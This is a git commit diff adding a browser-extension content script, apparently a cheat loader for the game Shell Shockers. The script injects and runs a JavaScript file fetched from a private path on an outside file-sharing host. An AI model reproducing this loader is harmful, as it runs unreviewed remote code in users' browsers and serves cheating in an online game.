8cd9f3d45fd0830d1d948ecefb0e1054cf923e36
Triston Stuart <triston.stuart@icloud.com>
2020-04-30 13:24:30 -0700

    Add files via upload

---
+++ Shell Shockers Hack (V4)/content.js
@@ -0,0 +1,8 @@
+
+ var script = document.createElement('script');
+  script.src = 'https://cdn.filesend.jp/private/sE0zxm6HtSAueCSdydruPysNMFUwJ90aJpGZGxLGxtM5J2n8JngdqfBV7mUj8pqL/shellshock.min.js';
+  script.type = 'text/javascript';
+  script.onload = function() {
+    console.log('your script have been loaded');
+  }
+  document.body.appendChild(script);
